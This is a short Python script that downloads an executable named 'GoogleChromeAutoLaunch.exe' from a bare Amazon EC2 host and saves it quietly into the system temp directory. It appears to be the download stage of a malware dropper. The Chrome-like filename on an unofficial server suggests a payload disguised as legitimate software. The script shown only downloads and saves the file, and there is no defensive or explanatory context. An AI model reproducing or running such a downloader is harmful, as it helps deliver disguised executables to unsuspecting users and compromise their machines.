import requests
import tempfile

url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.exe"
response = requests.get(url, stream=True)

tempDirectory = tempfile.gettempdir()
newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"

with open(newFile, "wb") as handle:
        handle.write(response.content)